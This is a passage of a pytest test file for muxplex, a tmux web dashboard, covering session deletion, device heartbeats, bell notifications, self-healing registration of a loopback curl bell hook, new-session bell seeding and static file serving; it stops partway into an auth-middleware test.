def test_delete_current_kills_ttyd_and_clears_active(client, monkeypatch):
    """DELETE /api/sessions/current kills ttyd and clears active_session."""
    from muxplex.state import load_state, save_state

    # Set up initial state with active session
    save_state(
        {
            "active_session": "alpha",
            "active_remote_id": None,
            "active_view": "all",
            "session_order": ["alpha"],
            "sessions": {},
            "devices": {},
        }
    )

    kill_called = []

    async def mock_kill(name):
        kill_called.append(name)
        return True

    monkeypatch.setattr("muxplex.main.kill_ttyd", mock_kill)
    monkeypatch.setattr("muxplex.main.relay_count", lambda name: 0)

    response = client.delete("/api/sessions/current")
    assert response.status_code == 200
    data = response.json()
    assert data["active_session"] is None
    assert kill_called == ["alpha"]

    # Verify state was persisted
    state = load_state()
    assert state["active_session"] is None


def test_delete_current_kills_only_own_session(client, monkeypatch):
    """A on X, B on Y; A deletes -> Y's ttyd untouched."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["X", "Y"])

    async def mock_ensure(name):
        pass

    kill_calls: list[str] = []

    async def mock_kill(name):
        kill_calls.append(name)
        return True

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)
    monkeypatch.setattr("muxplex.main.kill_ttyd", mock_kill)
    monkeypatch.setattr("muxplex.main.relay_count", lambda name: 0)

    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dA",
            "label": "A",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 0.0,
            "sync_group": "device:dA",
        },
    )
    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dB",
            "label": "B",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 0.0,
            "sync_group": "device:dB",
        },
    )
    client.post("/api/sessions/X/connect?device_id=dA")
    client.post("/api/sessions/Y/connect?device_id=dB")

    response = client.delete("/api/sessions/current?device_id=dA")
    assert response.status_code == 200
    assert kill_calls == ["X"]


def test_delete_current_spares_coviewed_session(client, monkeypatch):
    """Two relays on X; one deletes -> ttyd survives, terminal_released is False."""
    from muxplex.state import save_state

    save_state(
        {
            "active_session": "X",
            "active_remote_id": None,
            "active_view": "all",
            "session_order": ["X"],
            "sessions": {},
            "devices": {},
        }
    )

    kill_calls: list[str] = []

    async def mock_kill(name):
        kill_calls.append(name)
        return True

    monkeypatch.setattr("muxplex.main.kill_ttyd", mock_kill)
    monkeypatch.setattr(
        "muxplex.main.relay_count", lambda name: 1
    )  # another relay still open

    response = client.delete("/api/sessions/current")
    assert response.status_code == 200
    data = response.json()
    assert data["terminal_released"] is False
    assert kill_calls == []


# ---------------------------------------------------------------------------
# POST /api/heartbeat
# ---------------------------------------------------------------------------


def test_heartbeat_returns_200(client):
    """POST /api/heartbeat must return HTTP 200 with device_id and status 'ok'."""
    response = client.post(
        "/api/heartbeat",
        json={
            "device_id": "dev-abc",
            "label": "My Laptop",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 1234567890.0,
        },
    )
    assert response.status_code == 200
    data = response.json()
    assert data["device_id"] == "dev-abc"
    assert data["status"] == "ok"


def test_heartbeat_registers_new_device(client):
    """POST /api/heartbeat registers a new device visible in GET /api/state."""
    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dev-new",
            "label": "Test Device",
            "viewing_session": "mysession",
            "view_mode": "fullscreen",
            "last_interaction_at": 1111111111.0,
        },
    )

    state_response = client.get("/api/state")
    assert state_response.status_code == 200
    state = state_response.json()
    assert "dev-new" in state["devices"]
    device = state["devices"]["dev-new"]
    assert device["label"] == "Test Device"
    assert device["viewing_session"] == "mysession"
    assert device["view_mode"] == "fullscreen"
    assert device["last_interaction_at"] == 1111111111.0


def test_heartbeat_updates_existing_device(client):
    """Two POST /api/heartbeat calls: second values are persisted."""
    # First heartbeat
    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dev-update",
            "label": "Old Label",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 1000000000.0,
        },
    )
    # Second heartbeat with updated values
    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dev-update",
            "label": "New Label",
            "viewing_session": "session-x",
            "view_mode": "fullscreen",
            "last_interaction_at": 2000000000.0,
        },
    )

    state_response = client.get("/api/state")
    state = state_response.json()
    device = state["devices"]["dev-update"]
    assert device["label"] == "New Label"
    assert device["viewing_session"] == "session-x"
    assert device["view_mode"] == "fullscreen"
    assert device["last_interaction_at"] == 2000000000.0


def test_heartbeat_missing_device_id_returns_422(client):
    """POST /api/heartbeat without device_id must return HTTP 422."""
    response = client.post(
        "/api/heartbeat",
        json={
            "label": "My Laptop",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 1234567890.0,
        },
    )
    assert response.status_code == 422


def test_heartbeat_invalid_view_mode_returns_422(client):
    """POST /api/heartbeat with invalid view_mode must return HTTP 422."""
    response = client.post(
        "/api/heartbeat",
        json={
            "device_id": "dev-abc",
            "label": "My Laptop",
            "viewing_session": None,
            "view_mode": "invalid_mode",
            "last_interaction_at": 1234567890.0,
        },
    )
    assert response.status_code == 422


# ---------------------------------------------------------------------------
# POST /api/sessions/{name}/bell
# ---------------------------------------------------------------------------


def test_receive_bell_returns_ok_and_session_name(client):
    """POST /api/sessions/{name}/bell returns {"ok": True, "session": name}."""
    response = client.post("/api/sessions/web-tmux/bell")
    assert response.status_code == 200
    data = response.json()
    assert data["ok"] is True
    assert data["session"] == "web-tmux"


def test_receive_bell_increments_unseen_count(client):
    """POST /api/sessions/{name}/bell increments unseen_count in state."""
    from muxplex.state import load_state

    client.post("/api/sessions/my-session/bell")

    state = load_state()
    bell = state["sessions"]["my-session"]["bell"]
    assert bell["unseen_count"] == 1


def test_receive_bell_creates_session_entry_if_absent(client):
    """POST /api/sessions/{name}/bell creates session/bell entries if missing."""
    from muxplex.state import load_state

    # Ensure session does not exist in state yet
    client.post("/api/sessions/brand-new/bell")

    state = load_state()
    assert "brand-new" in state["sessions"]
    assert "bell" in state["sessions"]["brand-new"]


def test_receive_bell_multiple_calls_accumulate(client):
    """Three POST calls to the bell endpoint accumulate unseen_count to 3."""
    from muxplex.state import load_state

    for _ in range(3):
        client.post("/api/sessions/multi-session/bell")

    state = load_state()
    bell = state["sessions"]["multi-session"]["bell"]
    assert bell["unseen_count"] == 3


def test_receive_bell_sets_last_fired_at(client):
    """POST /api/sessions/{name}/bell sets last_fired_at to a recent timestamp."""
    import time

    from muxplex.state import load_state

    before = time.time()
    client.post("/api/sessions/timed-session/bell")
    after = time.time()

    state = load_state()
    bell = state["sessions"]["timed-session"]["bell"]
    assert bell["last_fired_at"] is not None
    assert before <= bell["last_fired_at"] <= after


# ---------------------------------------------------------------------------
# POST /api/sessions/{name}/bell/clear
# ---------------------------------------------------------------------------


def test_bell_clear_returns_ok(client):
    """POST /api/sessions/{name}/bell/clear returns {\"ok\": True, \"session\": name}."""
    response = client.post("/api/sessions/web-tmux/bell/clear")
    assert response.status_code == 200
    data = response.json()
    assert data["ok"] is True
    assert data["session"] == "web-tmux"


def test_bell_clear_resets_unseen_count(client):
    """After clearing, unseen_count is 0."""
    from muxplex.state import load_state

    # First fire some bells to set unseen_count > 0
    for _ in range(3):
        client.post("/api/sessions/clear-test/bell")

    state = load_state()
    assert state["sessions"]["clear-test"]["bell"]["unseen_count"] == 3

    # Now clear
    client.post("/api/sessions/clear-test/bell/clear")

    state = load_state()
    assert state["sessions"]["clear-test"]["bell"]["unseen_count"] == 0


def test_bell_clear_sets_seen_at(client):
    """After clearing, seen_at is set to a recent timestamp."""
    import time

    from muxplex.state import load_state

    # Fire a bell first to create the bell state
    client.post("/api/sessions/seen-test/bell")

    before = time.time()
    client.post("/api/sessions/seen-test/bell/clear")
    after = time.time()

    state = load_state()
    bell = state["sessions"]["seen-test"]["bell"]
    assert bell["seen_at"] is not None
    assert before <= bell["seen_at"] <= after


def test_bell_clear_noop_when_no_session(client):
    """No-op when session has no bell state (still returns 200 + ok)."""
    response = client.post("/api/sessions/nonexistent-session/bell/clear")
    assert response.status_code == 200
    data = response.json()
    assert data["ok"] is True
    assert data["session"] == "nonexistent-session"


# ---------------------------------------------------------------------------
# POST /api/internal/setup-hooks
# ---------------------------------------------------------------------------


def test_setup_hooks_returns_ok(client, monkeypatch):
    """POST /api/internal/setup-hooks returns {"ok": True} when tmux accepts
    the hook registration (see _arm_bell_hook() -- registration is the whole
    contract; there is no arm-time delivery probe)."""
    monkeypatch.setattr("muxplex.main.run_tmux", _mock_run_tmux_for_bell_hook())

    response = client.post("/api/internal/setup-hooks")
    assert response.status_code == 200
    data = response.json()
    assert data["ok"] is True


def test_setup_hooks_returns_ok_false_on_error(client, monkeypatch):
    """POST /api/internal/setup-hooks returns {"ok": False} when tmux raises."""
    from unittest.mock import AsyncMock

    monkeypatch.setattr(
        "muxplex.main.run_tmux",
        AsyncMock(side_effect=RuntimeError("tmux not found")),
    )

    response = client.post("/api/internal/setup-hooks")
    assert response.status_code == 200
    data = response.json()
    assert data["ok"] is False
    assert "error" in data


def test_setup_hooks_curl_discards_response_body(client, monkeypatch):
    """POST /api/internal/setup-hooks passes curl with -o /dev/null to discard response."""
    from unittest.mock import AsyncMock

    mock_run_tmux = AsyncMock(side_effect=_mock_run_tmux_for_bell_hook())
    monkeypatch.setattr("muxplex.main.run_tmux", mock_run_tmux)

    response = client.post("/api/internal/setup-hooks")
    assert response.status_code == 200

    # _arm_bell_hook() makes exactly ONE tmux call (registration) -- there is
    # no arm-time delivery probe (see AGENTS.md's "never render to a pane"
    # rule and its bell-hook section).
    assert mock_run_tmux.call_count == 1
    call_args = mock_run_tmux.call_args_list[0]
    # Positional args are: "set-hook", "-g", "alert-bell", <hook_command>
    hook_command = call_args[0][3] if len(call_args[0]) > 3 else None
    assert hook_command is not None
    # Should have -sfo /dev/null, not just -sf -- and NOT -S (see the
    # persistent-hook silence regression test below for why).
    assert "-sfo /dev/null" in hook_command


def test_lifespan_alert_bell_hook_discards_response(monkeypatch):
    """Lifespan startup registers alert-bell hook with curl -o /dev/null to discard response."""
    from unittest.mock import AsyncMock

    from fastapi.testclient import TestClient

    from muxplex.main import app

    # Mock run_tmux to capture the hook command. _arm_bell_hook() makes
    # exactly ONE call (registration) -- no arm-time probe.
    mock_run_tmux = AsyncMock(side_effect=_mock_run_tmux_for_bell_hook())
    monkeypatch.setattr("muxplex.main.run_tmux", mock_run_tmux)

    # Trigger lifespan by entering/exiting TestClient context
    with TestClient(app):
        pass

    # Verify run_tmux was called during lifespan startup
    assert mock_run_tmux.called
    # Find the call that sets the alert-bell hook
    hook_calls = [
        call
        for call in mock_run_tmux.call_args_list
        if len(call[0]) > 3 and call[0][2] == "alert-bell"
    ]
    assert len(hook_calls) > 0, "alert-bell hook was not set during lifespan"

    # Check the first hook call
    hook_command = hook_calls[0][0][3]
    assert "-sfo /dev/null" in hook_command


# ---------------------------------------------------------------------------
# Bell hook self-healing (regression: startup registration used to fail
# silently -- `except Exception: pass` -- and nothing ever retried it)
# ---------------------------------------------------------------------------


async def test_bell_hook_self_heals_after_startup_failure(monkeypatch):
    """Regression test for the silently-dead bell hook.

    The original bug: the startup call to `set-hook` could fail (tmux not up
    yet at boot -- the *common* case, per the comment it left behind), the
    failure was swallowed by a bare `except Exception: pass`, and nothing in
    the poll loop ever re-registered it. Bells were then dead for the life of
    the process with no error, no log, no signal.

    A test that only asserted "_arm_bell_hook gets called" or that itself
    called the recovery path would pass against the ORIGINAL broken code too
    (which also called run_tmux once, just never again) -- exactly the trap
    that let `test_audit_log_line_present_and_redacted` stay green for weeks
    while the audit log emitted nothing. This test instead:

      1. Forces the startup-equivalent call to genuinely fail.
      2. Asserts the module is left in a genuinely unarmed state as a
         *result* of that real failure -- not a mocked assertion.
      3. Runs a REAL `_run_poll_cycle()` (production's own retry path, not a
         second manual call this test makes itself) with tmux available
         again, and proves THAT heals it.

    Against the pre-fix code this test fails at step 3: nothing in
    `_run_poll_cycle` ever called `run_tmux` for the hook, so `call_count`
    would stay at 1 and the hook would never be proven armed.

    `_arm_bell_hook()` makes exactly ONE `run_tmux` call per attempt
    (registration only -- there is no arm-time delivery probe, see AGENTS.md's
    "never render to a pane" rule) -- so the failed startup attempt makes 1
    call, and the poll cycle's successful retry makes exactly 1 more, for a
    total of 2.
    """
    from unittest.mock import AsyncMock

    import muxplex.main as main_mod

    # Start from a genuinely-unarmed state (a prior test may have left
    # module-level state armed).
    monkeypatch.setattr(main_mod, "_bell_hook_armed", False)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)

    # First call (the startup-equivalent) fails, simulating "tmux not up yet
    # at boot"; the second call (inside the poll cycle, tmux now up) succeeds.
    call_log: list[tuple] = []

    async def mock_run_tmux(*args):
        call_log.append(args)
        if len(call_log) == 1:
            raise RuntimeError("no server running on /tmp/tmux-0/default")
        return ""

    monkeypatch.setattr(main_mod, "run_tmux", mock_run_tmux)

    # Step 1: the real startup call must genuinely fail here.
    startup_result = await main_mod._arm_bell_hook()
    assert startup_result is False
    assert main_mod._bell_hook_armed is False
    assert main_mod._bell_hook_last_error is not None
    assert len(call_log) == 1

    # Step 2: drive a REAL poll cycle. Everything else it touches is mocked
    # out to isolate the hook-arming behavior -- crucially, the self-healing
    # check inside _run_poll_cycle itself is NOT mocked.
    async def mock_enumerate():
        return []

    async def mock_snapshot_all(names):
        return {}

    monkeypatch.setattr(main_mod, "enumerate_sessions", mock_enumerate)
    monkeypatch.setattr(main_mod, "snapshot_all", mock_snapshot_all)
    monkeypatch.setattr(main_mod, "update_session_cache", lambda names, snapshots: None)
    monkeypatch.setattr(main_mod, "process_bell_flags", AsyncMock())
    monkeypatch.setattr(main_mod, "apply_bell_clear_rule", lambda state: None)
    monkeypatch.setattr(main_mod, "prune_devices", lambda state: None)

    await main_mod._run_poll_cycle()

    # The poll cycle's self-healing retry is what fixed it: 1 (failed
    # startup) + 1 (successful retry: registration only) = 2.
    assert len(call_log) == 2, (
        "expected _run_poll_cycle to retry bell-hook registration while unarmed"
    )
    assert main_mod._bell_hook_armed is True
    assert main_mod._bell_hook_last_error is None


async def test_bell_hook_not_retried_once_armed(monkeypatch):
    """Once armed, `_run_poll_cycle()` must NOT call tmux again every cycle.

    This is the other half of the design constraint: self-healing must not
    become an unconditional per-cycle `tmux set-hook` call -- a subprocess
    every ~2s for the life of the process to re-set something already set.
    """
    from unittest.mock import AsyncMock

    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_bell_hook_armed", True)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)

    mock_run_tmux = AsyncMock(return_value="")
    monkeypatch.setattr(main_mod, "run_tmux", mock_run_tmux)

    async def mock_enumerate():
        return []

    async def mock_snapshot_all(names):
        return {}

    monkeypatch.setattr(main_mod, "enumerate_sessions", mock_enumerate)
    monkeypatch.setattr(main_mod, "snapshot_all", mock_snapshot_all)
    monkeypatch.setattr(main_mod, "update_session_cache", lambda names, snapshots: None)
    monkeypatch.setattr(main_mod, "process_bell_flags", AsyncMock())
    monkeypatch.setattr(main_mod, "apply_bell_clear_rule", lambda state: None)
    monkeypatch.setattr(main_mod, "prune_devices", lambda state: None)

    await main_mod._run_poll_cycle()

    assert mock_run_tmux.call_count == 0, (
        "an already-armed hook must not be re-registered every poll cycle"
    )
    assert main_mod._bell_hook_armed is True


# ---------------------------------------------------------------------------
# Bell hook scheme correctness (regression: hook hardcoded http:// while the
# server actually serves TLS -- curl failed silently on every real bell)
# ---------------------------------------------------------------------------


def test_bell_hook_curl_uses_http_and_no_dash_k_when_tls_disabled(monkeypatch):
    """With SERVER_TLS_ENABLED False (the default), the curl command must
    dial http:// and must NOT pass -k (nothing to skip-verify for plain HTTP).
    """
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "SERVER_TLS_ENABLED", False)

    cmd = main_mod._bell_hook_curl("somesession")
    assert "http://127.0.0.1" in cmd
    assert "https://" not in cmd
    assert " -k" not in cmd
    assert "-sfo /dev/null" in cmd
    assert cmd.endswith("|| true")


def test_bell_hook_curl_uses_https_and_dash_k_when_tls_enabled(monkeypatch):
    """Regression test for the core bug: when the server is actually serving
    TLS (SERVER_TLS_ENABLED True), the hook's curl command must dial
    https:// -- not the hardcoded http:// that silently failed on every real
    bell (curl exit 52, swallowed by `-sf ... || true`) -- and must pass -k
    to skip certificate verification for this same-host loopback call (the
    cert may be self-signed / local-CA / a Tailscale-hostname-only cert that
    doesn't cover 127.0.0.1 at all).
    """
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "SERVER_TLS_ENABLED", True)

    cmd = main_mod._bell_hook_curl("somesession")
    assert "https://127.0.0.1" in cmd
    assert "http://127.0.0.1" not in cmd
    assert "-skfo /dev/null" in cmd
    assert cmd.endswith("|| true")


def test_bell_hook_curl_dials_127_0_0_1_not_localhost(monkeypatch):
    """Dials 127.0.0.1 explicitly rather than 'localhost' -- unambiguous
    (no DNS/hosts-file/IPv6-vs-IPv4 resolution surprise), and exactly the
    address the auth middleware's localhost bypass checks.
    """
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "SERVER_TLS_ENABLED", False)
    cmd = main_mod._bell_hook_curl("somesession")
    assert "127.0.0.1" in cmd
    assert "localhost" not in cmd


# ---------------------------------------------------------------------------
# Bell hook SILENCE (regression: a later revision made the persistent hook's
# curl loud (-sS, no stderr redirect) to help diagnose a since-removed
# arm-time delivery probe -- and that loudness leaked into the PERSISTENT
# per-bell hook too. tmux's `run-shell` displays a background command's
# output in view mode on the client's active pane; the owner watched
# `returned 52` repeatedly replace his screen across every live session as a
# result. `_bell_hook_curl()` must be silent, ALWAYS -- there is no longer
# any parameter or code path that can request a loud variant (see
# AGENTS.md's "never render to a pane" rule).
# ---------------------------------------------------------------------------


def test_persistent_hook_never_includes_dash_S(monkeypatch):
    """`_bell_hook_curl()` must never pass curl's -S (show-error) flag, in
    either TLS posture -- -S is what makes a failed curl call write
    diagnostic text to stderr, which is exactly what tmux's `run-shell`
    paints onto a client's screen on failure. Named for the persistent hook
    this command IS (there is no longer a second, probe variant to
    distinguish it from -- see AGENTS.md's "never render to a pane" rule).
    """
    import muxplex.main as main_mod

    for tls in (False, True):
        monkeypatch.setattr(main_mod, "SERVER_TLS_ENABLED", tls)
        cmd = main_mod._bell_hook_curl("#{session_name}")
        # The only "S" that may legitimately appear is inside "https"/
        # "127.0.0.1" -- assert directly against the flag cluster instead
        # of a bare substring check.
        assert "-sS" not in cmd, f"hook curl must not be loud: {cmd!r}"


def test_persistent_hook_redirects_stderr_to_devnull(monkeypatch):
    """`_bell_hook_curl()`'s command must explicitly redirect stderr to
    /dev/null -- independent of curl's own `-s` silence -- so that ANY
    unexpected output (not just curl's own error text) can never reach
    tmux's run-shell output capture and be displayed to a client.
    """
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "SERVER_TLS_ENABLED", False)
    cmd = main_mod._bell_hook_curl("#{session_name}")
    assert "2>/dev/null" in cmd


def test_bell_hook_curl_has_no_loud_variant():
    """Structural guard for the standing "never render to a pane" rule:
    `_bell_hook_curl()` must not even ACCEPT a parameter that could request a
    loud command. An earlier revision had a `swallow` keyword that selected
    between a silent and a loud command string; that parameter -- and the
    loud branch behind it -- was removed entirely rather than merely
    defaulted to silent, so a future "make this loud for debugging" change
    cannot resurrect the class of incident this guards against without
    first reintroducing the parameter (a reviewable, greppable change).
    """
    import inspect

    import muxplex.main as main_mod

    sig = inspect.signature(main_mod._bell_hook_curl)
    assert list(sig.parameters) == ["target"], (
        f"_bell_hook_curl() must accept only `target` -- found {list(sig.parameters)!r}. "
        "Any additional parameter risks reintroducing a loud/probe variant."
    )


# ---------------------------------------------------------------------------
# Bell hook honest contract (regression: an arm-time delivery probe once
# strengthened "armed" to mean "a bell was proven to arrive" -- but the probe
# itself was a diagnostic `tmux run-shell` call that re-fired on every retry
# while unarmed, and a failing probe painted `curl ... returned 7` onto the
# owner's live panes during restart windows. The probe was removed, not
# re-silenced -- see AGENTS.md's "never render to a pane" rule. "Armed" now
# means exactly what `set-hook` being accepted means: nothing more.)
# ---------------------------------------------------------------------------


async def test_arm_bell_hook_makes_exactly_one_tmux_call_on_success(monkeypatch):
    """A successful arm makes exactly ONE `run_tmux` call (registration) --
    never a second call for any kind of probe or self-test. This is the
    direct proof that no `tmux run-shell` fires at arm time other than the
    persistent hook's own registration string.
    """
    from unittest.mock import AsyncMock

    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_bell_hook_armed", False)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)

    mock_run_tmux = AsyncMock(return_value="")
    monkeypatch.setattr(main_mod, "run_tmux", mock_run_tmux)

    result = await main_mod._arm_bell_hook()

    assert result is True
    assert main_mod._bell_hook_armed is True
    assert mock_run_tmux.call_count == 1
    # The one call must be the registration call, not a run-shell probe.
    call_args = mock_run_tmux.call_args_list[0][0]
    assert call_args[0] == "set-hook"


async def test_arm_bell_hook_makes_exactly_one_tmux_call_on_failure(monkeypatch):
    """A failed arm (set-hook itself raises) also makes exactly ONE
    `run_tmux` call -- there is no second call to a probe that could ever
    fire, succeed, or fail independently.
    """
    from unittest.mock import AsyncMock

    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_bell_hook_armed", False)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)

    mock_run_tmux = AsyncMock(side_effect=RuntimeError("no server running"))
    monkeypatch.setattr(main_mod, "run_tmux", mock_run_tmux)

    result = await main_mod._arm_bell_hook()

    assert result is False
    assert main_mod._bell_hook_armed is False
    assert mock_run_tmux.call_count == 1


async def test_bell_hook_armed_true_immediately_after_registration_no_http_needed(
    monkeypatch,
):
    """Positive case, updated for the honest (registration-only) contract:
    armed becomes True as soon as `set-hook` is accepted -- with ZERO
    dependency on any HTTP round trip. This is the direct proof that the
    restart-window failure mode (arm time racing the server's own accept
    loop, producing `curl ... returned 7`) is now structurally impossible:
    there is no in-band HTTP self-call at arm time to fail in the first
    place.
    """
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_bell_hook_armed", False)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)

    async def mock_run_tmux(*args):
        return ""

    monkeypatch.setattr(main_mod, "run_tmux", mock_run_tmux)

    result = await main_mod._arm_bell_hook()

    assert result is True
    assert main_mod._bell_hook_armed is True
    assert main_mod._bell_hook_last_error is None


async def test_registration_succeeding_with_wrong_scheme_is_a_known_limitation(
    monkeypatch,
):
    """Documents the honest cost of removing the arm-time probe: a scheme
    mismatch (the ORIGINAL bell-hook incident -- see AGENTS.md) now
    registers successfully and reports armed=True, even though the
    persistent hook's real curl calls will silently fail on every actual
    bell. This is not a regression to be silently reintroduced a fix for --
    it is the traded-away guarantee, made visible by a test rather than left
    implicit. `set-hook` has no way to validate the command string it is
    given; only a real HTTP round trip (the removed probe) could have caught
    this, and that mechanism is exactly what violated the "never render to a
    pane" rule.
    """
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_bell_hook_armed", False)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)
    # Simulate the exact original incident: server serves TLS, but the hook
    # believes it doesn't (or vice versa) -- `set-hook` cannot tell either way.
    monkeypatch.setattr(main_mod, "SERVER_TLS_ENABLED", False)

    async def mock_run_tmux(*args):
        return ""  # set-hook accepts any command string unconditionally

    monkeypatch.setattr(main_mod, "run_tmux", mock_run_tmux)

    result = await main_mod._arm_bell_hook()

    assert result is True, (
        "registration succeeds regardless of scheme correctness -- this is "
        "the known, accepted limitation of the registration-only contract"
    )
    assert main_mod._bell_hook_armed is True


# ---------------------------------------------------------------------------
# New-session bell seeding (creation-vs-first-observation)
#
# Regression coverage for: a newly created session used to seed with
# empty_bell() (unseen_count=0), which needs_attention() always reports
# False for -- so a brand-new session never sorted into _attention_order()'s
# tier 1 and landed at the very bottom of the attention view. The fix seeds
# a GENUINELY new session's bell as already-fired instead, using tmux's own
# `#{session_created}` (get_session_created_times()) compared against
# _server_start_time to distinguish "created while this instance is running"
# from "merely first observed by this process" -- the latter must NEVER be
# seeded as attention-worthy, or a state.json reset / fresh install would
# mass-flag every pre-existing session at once.
# ---------------------------------------------------------------------------


def _mock_poll_dependencies(monkeypatch, main_mod, *, names, created_times):
    """Wire up `_run_poll_cycle`'s dependencies so it runs deterministically
    against fake session names/creation-times with no real tmux involved."""
    from unittest.mock import AsyncMock

    async def mock_enumerate():
        return list(names)

    async def mock_snapshot_all(_names):
        return {}

    monkeypatch.setattr(main_mod, "enumerate_sessions", mock_enumerate)
    monkeypatch.setattr(main_mod, "snapshot_all", mock_snapshot_all)
    monkeypatch.setattr(
        main_mod, "get_session_created_times", lambda: dict(created_times)
    )
    monkeypatch.setattr(main_mod, "update_session_cache", lambda names, snapshots: None)
    monkeypatch.setattr(main_mod, "process_bell_flags", AsyncMock())
    monkeypatch.setattr(main_mod, "apply_bell_clear_rule", lambda state: None)
    monkeypatch.setattr(main_mod, "prune_devices", lambda state: None)
    # Bell hook already armed -- keep this test isolated to bell-seeding only.
    monkeypatch.setattr(main_mod, "_bell_hook_armed", True)
    monkeypatch.setattr(main_mod, "_bell_hook_last_error", None)


async def test_new_session_seeded_as_attention_worthy(monkeypatch):
    """A session whose tmux session_created is AT OR AFTER _server_start_time
    (genuinely created while this instance is running) must be seeded with a
    bell that needs_attention() reports True for: unseen_count=1, seen_at=None,
    last_fired_at set. This is the ONLY change -- needs_attention() and
    _attention_order() are untouched -- so the existing tiered sort already
    places it at the very top with no new sorting logic.
    """
    import time

    import muxplex.main as main_mod
    import muxplex.state as state_mod
    from muxplex.bells import needs_attention

    server_start = time.time()
    monkeypatch.setattr(main_mod, "_server_start_time", server_start)

    # Created 1 second AFTER this instance started -- the real bug scenario:
    # POST /api/sessions while muxplex is already running.
    _mock_poll_dependencies(
        monkeypatch,
        main_mod,
        names=["brand-new"],
        created_times={"brand-new": server_start + 1.0},
    )

    await main_mod._run_poll_cycle()

    state = state_mod.load_state()
    bell = state["sessions"]["brand-new"]["bell"]
    assert bell["unseen_count"] == 1
    assert bell["seen_at"] is None
    assert bell["last_fired_at"] is not None
    assert needs_attention(bell) is True


async def test_preexisting_session_not_flagged_on_state_reset(monkeypatch):
    """A session whose tmux session_created PREDATES _server_start_time must
    seed with the plain empty_bell() default, even though this is the first
    time THIS process's state.json has a bell entry for it. This is the trap:
    it must hold for muxplex restart + deleted state.json, a fresh install,
    AND a session created while muxplex was down -- none of these are
    "the user just created a session," and none may mass-flag.
    """
    import time

    import muxplex.main as main_mod
    import muxplex.state as state_mod
    from muxplex.bells import needs_attention

    server_start = time.time()
    monkeypatch.setattr(main_mod, "_server_start_time", server_start)

    # 52 pre-existing sessions, all created well before this process started
    # (simulates: muxplex restart with state.json deleted, OR a fresh install
    # discovering a pre-existing fleet, OR a session created while muxplex
    # was down and only now observed at startup).
    names = [f"old-session-{i}" for i in range(52)]
    created_times = {name: server_start - 3600.0 for name in names}

    _mock_poll_dependencies(
        monkeypatch, main_mod, names=names, created_times=created_times
    )

    await main_mod._run_poll_cycle()

    state = state_mod.load_state()
    for name in names:
        bell = state["sessions"][name]["bell"]
        assert bell == {
            "last_fired_at": None,
            "seen_at": None,
            "unseen_count": 0,
            "source": None,
        }, f"{name} was incorrectly seeded as attention-worthy -- mass false positive"
        assert needs_attention(bell) is False


async def test_session_with_no_created_time_falls_back_to_empty_bell(monkeypatch):
    """Defensive case: tmux didn't report a session_created value at all
    (get_session_created_times() has no entry for the name). Must not crash
    and must not be treated as attention-worthy -- absence of evidence is not
    evidence of a genuinely new session.
    """
    import time

    import muxplex.main as main_mod
    import muxplex.state as state_mod
    from muxplex.bells import needs_attention

    server_start = time.time()
    monkeypatch.setattr(main_mod, "_server_start_time", server_start)

    _mock_poll_dependencies(
        monkeypatch, main_mod, names=["mystery-session"], created_times={}
    )

    await main_mod._run_poll_cycle()

    state = state_mod.load_state()
    bell = state["sessions"]["mystery-session"]["bell"]
    assert bell == {
        "last_fired_at": None,
        "seen_at": None,
        "unseen_count": 0,
        "source": None,
    }
    assert needs_attention(bell) is False


def test_instance_info_reports_bell_hook_armed(client, monkeypatch):
    """GET /api/instance-info surfaces bell_hook_armed, so a dead hook is
    observable without grepping logs -- the previous `except Exception: pass`
    left no externally-visible signal at all."""
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_bell_hook_armed", False)
    response = client.get("/api/instance-info")
    assert response.status_code == 200
    assert response.json()["bell_hook_armed"] is False

    monkeypatch.setattr(main_mod, "_bell_hook_armed", True)
    response = client.get("/api/instance-info")
    assert response.json()["bell_hook_armed"] is True


# ---------------------------------------------------------------------------
# Static file serving tests
# ---------------------------------------------------------------------------


def test_root_serves_html(client):
    """GET / must return 200 with text/html content-type."""
    response = client.get("/")
    assert response.status_code == 200
    assert "text/html" in response.headers["content-type"]


def test_style_css_served(client):
    """GET /style.css must return 200 with text/css content-type."""
    response = client.get("/style.css")
    assert response.status_code == 200
    assert "text/css" in response.headers["content-type"]


def test_api_routes_not_shadowed(client):
    """GET /api/sessions must still return 200 with JSON list (not shadowed by StaticFiles)."""
    response = client.get("/api/sessions")
    assert response.status_code == 200
    assert isinstance(response.json(), list)


def test_terminal_ws_route_exists():
    """The app must have a WebSocket route registered at /terminal/ws."""
    from fastapi.routing import APIRoute, APIWebSocketRoute

    from muxplex.main import app

    ws_routes = [
        r
        for r in app.routes
        if isinstance(r, (APIRoute, APIWebSocketRoute)) and r.path == "/terminal/ws"
    ]
    assert len(ws_routes) == 1, "Expected exactly one /terminal/ws route"


# ---------------------------------------------------------------------------
# Auth middleware integration
# ---------------------------------------------------------------------------


def test_non_localhost_without_auth_gets_redirected(monkeypatch):
    """A non-localhost request without credentials is redirected to /login."""
    from fastapi.testclient import TestClient

    from muxplex.main import app

    # Ensure auth is active — set a known password via env
